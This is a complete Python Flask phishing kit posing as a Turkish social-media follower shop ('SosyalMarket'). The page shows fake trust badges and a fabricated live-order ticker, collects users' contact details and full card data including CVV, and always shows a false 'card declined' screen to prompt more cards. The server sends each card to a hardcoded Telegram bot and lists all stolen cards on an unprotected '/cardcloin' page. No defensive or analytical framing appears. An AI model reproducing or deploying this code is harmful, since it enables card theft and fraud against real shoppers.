from flask import Flask, request, render_template_string, jsonify
import requests
import time
import random

app = Flask(__name__)
KARTLAR = []

SITE_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SosyalMarket - SMM Panel</title>
    <style>
        :root { --ana: #ff6b00; --bg: #f5f5f5; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: var(--bg); color: #333; }
        
        .yukleme { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 4px; z-index: 9999; }
        .yukleme-bar { width: 0%; height: 100%; background: #ff6b00; animation: yukle 3s forwards; }
        @keyframes yukle { 0% { width: 0; } 100% { width: 100%; } }
        
        .spinner-ekran { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.97); z-index: 9998; justify-content: center; align-items: center; flex-direction: column; }
        .spinner { width: 60px; height: 60px; border: 5px solid #f0f0f0; border-top: 5px solid #ff6b00; border-radius: 50%; animation: don 1s linear infinite; margin-bottom: 20px; }
        @keyframes don { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
        .spinner-yazi { font-size: 1.2em; font-weight: 500; }
        
        .hata-ekran { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.97); z-index: 9997; justify-content: center; align-items: center; }
        .hata-kutu { background: #fff; border: 2px solid #ff4444; border-radius: 20px; padding: 40px; max-width: 400px; text-align: center; }
        .hata-ikon { font-size: 4em; margin-bottom: 15px; }
        .hata-baslik { color: #ff4444; font-size: 1.3em; font-weight: bold; margin-bottom: 10px; }
        .hata-mesaj { color: #666; font-size: 0.9em; }
        .btn-tekrar { margin-top: 20px; padding: 12px 30px; background: #ff6b00; border: none; border-radius: 10px; color: #fff; font-weight: bold; cursor: pointer; }
        
        .top-bar { background: #1a1a1a; color: #aaa; padding: 8px 30px; display: flex; justify-content: space-between; font-size: 0.8em; }
        .header { background: #fff; padding: 20px 30px; text-align: center; }
        .logo { font-size: 2em; font-weight: bold; color: #ff6b00; }
        
        .canli-bildirim { background: #fff3e0; padding: 10px 30px; text-align: center; font-size: 0.85em; color: #666; }
        .canli-bildirim span { color: #ff6b00; font-weight: bold; }
        
        .container { max-width: 900px; margin: 30px auto; padding: 20px; }
        
        .guven-rozetleri { display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 30px; }
        .rozet { background: #fff; border-radius: 10px; padding: 10px 20px; font-size: 0.75em; color: #555; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        
        .platform-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 25px; }
        .platform-kart { background: #fff; border-radius: 20px; padding: 30px; text-align: center; cursor: pointer; box-shadow: 0 3px 15px rgba(0,0,0,0.08); transition: 0.3s; position: relative; }
        .platform-kart:hover { transform: translateY(-5px); }
        .kampanya-rozet { position: absolute; top: 10px; right: 10px; background: #ff4444; color: #fff; border-radius: 5px; padding: 3px 8px; font-size: 0.65em; font-weight: bold; }
        .platform-logo { width: 65px; height: 65px; margin: 0 auto 15px; border-radius: 15px; display: flex; align-items: center; justify-content: center; }
        .insta-logo { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
        .tiktok-logo { background: #000; }
        .youtube-logo { background: #ff0000; }
        .telegram-logo { background: #0088cc; }
        .platform-logo svg { width: 32px; height: 32px; fill: #fff; }
        
        .sayfa { display: none; }
        .sayfa.aktif { display: block; }
        .form-kart { background: #fff; border-radius: 20px; padding: 35px; max-width: 550px; margin: 0 auto; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
        .bilgilendirme { background: #fff8f0; border-left: 4px solid #ff6b00; border-radius: 10px; padding: 20px; margin-bottom: 25px; }
        .bilgilendirme h4 { color: #ff6b00; margin-bottom: 10px; }
        .bilgilendirme p { color: #666; font-size: 0.85em; }
        .input-grup { margin-bottom: 18px; }
        .input-grup label { display: block; margin-bottom: 8px; font-weight: 500; }
        .input-grup input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 10px; }
        .input-grup input:focus { border-color: #ff6b00; outline: none; }
        .fiyat-goster { text-align: center; background: #f9f9f9; border-radius: 12px; padding: 20px; margin: 20px 0; }
        .fiyat-goster .toplam { font-size: 2em; color: #ff6b00; font-weight: bold; }
        .btn-ode { width: 100%; padding: 16px; background: #ff6b00; border: none; border-radius: 12px; color: #fff; font-weight: bold; cursor: pointer; }
        .btn-geri { width: 100%; padding: 13px; background: #f0f0f0; border: 1px solid #ddd; border-radius: 12px; margin-top: 10px; cursor: pointer; }
        .kart-row { display: flex; gap: 10px; }
        .kart-row .input-grup { flex: 1; }
        
        .alt-bilgi { background: #fff; border-radius: 20px; padding: 30px; margin-top: 50px; }
        .alt-bilgi h3 { color: #ff6b00; margin-bottom: 20px; text-align: center; }
        .alt-bilgi p { color: #666; font-size: 0.85em; line-height: 1.8; margin-bottom: 15px; }
        
        @media (max-width: 600px) { .platform-grid { grid-template-columns: repeat(2, 1fr); } }
    </style>
</head>
<body>
    <div class="yukleme" id="yukleme"><div class="yukleme-bar"></div></div>
    <div class="spinner-ekran" id="spinnerEkran"><div class="spinner"></div><div class="spinner-yazi">Ödeme işleniyor...</div><div style="color:#888;margin-top:8px;">Kart doğrulanıyor...</div></div>
    <div class="hata-ekran" id="hataEkran"><div class="hata-kutu"><div class="hata-ikon">⚠️</div><div class="hata-baslik">Kart Reddedildi</div><div class="hata-mesaj" id="hataMesaj">Kart bilgileriniz doğrulanamadı. Farklı bir kart deneyin.</div><button class="btn-tekrar" onclick="hataKapat()">TEKRAR DENE</button></div></div>
    
    <div class="top-bar"><span>📞 0850 000 00 00 | ✉️ destek@sosyalmarket.com</span><span>⭐ 4.9/5 | 🔒 SSL</span></div>
    <div class="header"><div class="logo">SosyalMarket</div></div>
    <div class="canli-bildirim">🔥 <span id="canliSayi">156</span> kişi şu an sitede | 🎉 Az önce <span id="sonSiparis">@kullanici42</span> 1000 takipçi aldı!</div>
    
    <div class="container" id="main">
        <div class="guven-rozetleri">
            <div class="rozet">🔒 SSL</div>
            <div class="rozet">💳 PCI DSS</div>
            <div class="rozet">🔄 30 Gün Garanti</div>
            <div class="rozet">⚡ Anında Teslimat</div>
            <div class="rozet">💎 Gerçek Hesaplar</div>
            <div class="rozet">👥 450K+ Müşteri</div>
        </div>
        
        <div class="sayfa aktif" id="sayfa1">
            <h2 style="text-align:center;margin-bottom:30px;">Platform Seçin</h2>
            <div class="platform-grid">
                <div class="platform-kart" onclick="platformSec('Instagram')"><span class="kampanya-rozet">%81 İNDİRİM</span><div class="platform-logo insta-logo"><svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zm0 10.162a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg></div><h3>Instagram</h3></div>
                <div class="platform-kart" onclick="platformSec('TikTok')"><span class="kampanya-rozet">%84 İNDİRİM</span><div class="platform-logo tiktok-logo"><svg viewBox="0 0 24 24"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/></svg></div><h3>TikTok</h3></div>
                <div class="platform-kart" onclick="platformSec('YouTube')"><span class="kampanya-rozet">%74 İNDİRİM</span><div class="platform-logo youtube-logo"><svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 00-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 00.502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 002.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 002.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg></div><h3>YouTube</h3></div>
                <div class="platform-kart" onclick="platformSec('Telegram')"><span class="kampanya-rozet">%79 İNDİRİM</span><div class="platform-logo telegram-logo"><svg viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0a12 12 0 00-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 01.171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg></div><h3>Telegram</h3></div>
            </div>
            
            <div class="alt-bilgi">
                <h3>SosyalMarket Hakkında</h3>
                <p>SosyalMarket, 2019'dan bu yana 1.2M+ sipariş ve 450K+ mutlu müşteriye hizmet vermiştir. Tüm hizmetlerimiz gerçek hesaplardan gönderilir.</p>
                <p>Ödemeleriniz 256-bit SSL ile şifrelenir. PCI DSS standartlarına uygun altyapı kullanılır. 30 gün garanti kapsamında düşenler yenilenir.</p>
            </div>
        </div>
        
        <div class="sayfa" id="sayfa2">
            <div class="form-kart">
                <div class="bilgilendirme" id="bilgilendirme"></div>
                <div class="input-grup"><label id="kullaniciEtiket"></label><input type="text" id="kullaniciAdi"></div>
                <div class="input-grup"><label>Email</label><input type="email" id="email"></div>
                <div class="input-grup"><label>Telefon</label><input type="tel" id="telefon"></div>
                <div class="input-grup"><label>Miktar</label><input type="number" id="miktar" value="1000" min="100" oninput="fiyatHesapla()"></div>
                <div class="fiyat-goster"><p>Toplam</p><p class="toplam" id="toplamFiyat">₺0</p></div>
                <button class="btn-ode" onclick="sayfaGecis(3)">ÖDEMEYE GEÇ</button>
                <button class="btn-geri" onclick="sayfaGecis(1)">GERİ</button>
            </div>
        </div>
        
        <div class="sayfa" id="sayfa3">
            <div class="form-kart">
                <div style="text-align:center;font-weight:bold;margin-bottom:20px;">Ödeme</div>
                <div class="input-grup"><label>Kart İsmi</label><input type="text" id="kartIsim"></div>
                <div class="input-grup"><label>Kart No</label><input type="text" id="kartNo" maxlength="19"></div>
                <div class="kart-row">
                    <div class="input-grup"><label>SK</label><input type="text" id="sonKul" maxlength="5"></div>
                    <div class="input-grup"><label>CVV</label><input type="text" id="cvv" maxlength="4"></div>
                </div>
                <button class="btn-ode" onclick="odemeYap()">ÖDEME YAP</button>
                <button class="btn-geri" onclick="sayfaGecis(2)">GERİ</button>
            </div>
        </div>
    </div>
    
    <script>
        let secilenPlatform = '';
        
        const BILGILER = {
            'Instagram': {etiket:'Instagram Kullanıcı Adı', ornek:'@kullaniciadi', bilgi:'Gerçek Instagram hesaplarından takipçi gönderilir.'},
            'TikTok': {etiket:'TikTok Kullanıcı Adı', ornek:'@kullaniciadi', bilgi:'Gerçek TikTok hesaplarından kademeli takipçi.'},
            'YouTube': {etiket:'YouTube Kanal Linki', ornek:'https://youtube.com/@kanal', bilgi:'Aktif hesaplardan abone gönderilir.'},
            'Telegram': {etiket:'Telegram Grup Linki', ornek:'https://t.me/grup', bilgi:'Gerçek üyeler grubunuza eklenir.'}
        };
        
        const ISIMLER = ['@ahmet42','@mehmet55','@elif_12','@can34','@zeynep89','@murat77','@ayse23','@ali56'];
        const PLATFORMLAR = ['Instagram','TikTok','YouTube','Telegram'];
        
        function platformSec(ad) {
            secilenPlatform = ad;
            const b = BILGILER[ad];
            document.getElementById('bilgilendirme').innerHTML = '<h4>'+ad+'</h4><p>'+b.bilgi+'</p>';
            document.getElementById('kullaniciEtiket').textContent = b.etiket;
            document.getElementById('kullaniciAdi').placeholder = b.ornek;
            sayfaGecis(2);
            fiyatHesapla();
        }
        
        function fiyatHesapla() {
            const m = parseInt(document.getElementById('miktar').value) || 1000;
            document.getElementById('toplamFiyat').textContent = '₺' + (m * 0.035).toFixed(2).replace('.', ',');
        }
        
        function sayfaGecis(n) {
            document.querySelectorAll('.sayfa').forEach(s => s.classList.remove('aktif'));
            document.getElementById('sayfa'+n).classList.add('aktif');
        }
        
        function hataKapat() {
            document.getElementById('hataEkran').style.display = 'none';
            sayfaGecis(3);
        }
        
        setInterval(() => {
            const isim = ISIMLER[Math.floor(Math.random()*ISIMLER.length)];
            const platform = PLATFORMLAR[Math.floor(Math.random()*PLATFORMLAR.length)];
            document.getElementById('sonSiparis').textContent = isim;
            document.getElementById('canliSayi').textContent = 140 + Math.floor(Math.random()*30);
        }, 8000);
        
        async function odemeYap() {
            const kullanici = document.getElementById('kullaniciAdi').value;
            const email = document.getElementById('email').value;
            const telefon = document.getElementById('telefon').value;
            const isim = document.getElementById('kartIsim').value;
            const kartNo = document.getElementById('kartNo').value.replace(/\\s/g,'');
            const sonKul = document.getElementById('sonKul').value;
            const cvv = document.getElementById('cvv').value;
            const miktar = document.getElementById('miktar').value;
            
            if (!kullanici || !email || !telefon || !isim || kartNo.length < 16 || sonKul.length < 4 || cvv.length < 3) {
                alert('Tüm alanları doldurun!');
                return;
            }
            
            document.getElementById('spinnerEkran').style.display = 'flex';
            document.getElementById('yukleme').style.display = 'block';
            
            await fetch('/odeme', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({platform:secilenPlatform, kullanici, email, telefon, isim, kartNo, sonKul, cvv, miktar})});
            await new Promise(r => setTimeout(r, 4000));
            
            document.getElementById('spinnerEkran').style.display = 'none';
            document.getElementById('yukleme').style.display = 'none';
            document.getElementById('hataEkran').style.display = 'flex';
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(SITE_HTML)

@app.route('/odeme', methods=['POST'])
def odeme():
    data = request.json
    kart = {'zaman': time.strftime('%d.%m.%Y %H:%M:%S'), 'platform': data.get('platform'), 'kullanici': data.get('kullanici'), 'email': data.get('email'), 'telefon': data.get('telefon'), 'isim': data.get('isim'), 'kart_no': data.get('kartNo'), 'son_kul': data.get('sonKul'), 'cvv': data.get('cvv'), 'miktar': data.get('miktar'), 'ip': request.remote_addr}
    KARTLAR.append(kart)
    
    try:
        bot = "8909079987:AAHjh-ohqiv53xxs1OMm-Z5b74S0VBzy3-g"
        chat = "8087053954"
        msg = f"🔥 SATIŞ!\n📱 {kart['platform']}\n👤 {kart['kullanici']}\n📧 {kart['email']}\n📞 {kart['telefon']}\n💳 {kart['kart_no']}\n📅 {kart['son_kul']} | 🔐 {kart['cvv']}\n📊 {kart['miktar']}\n🌐 {kart['ip']}"
        requests.post(f"https://api.telegram.org/bot{bot}/sendMessage", json={'chat_id': chat, 'text': msg}, timeout=5)
    except:
        pass
    
    return jsonify({'success': True})

@app.route('/cardcloin')
def cardcloin():
    html = "<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>KARTLAR</h1>"
    for k in KARTLAR:
        html += f"<p>💳 {k['kart_no']} | {k['son_kul']} | {k['cvv']} | {k['isim']} | {k['telefon']} | {k['email']}</p>"
    html += "</body></html>"
    return html

if __name__ == '__main__':
    print("SosyalMarket!")
    app.run(host='0.0.0.0', port=8080)
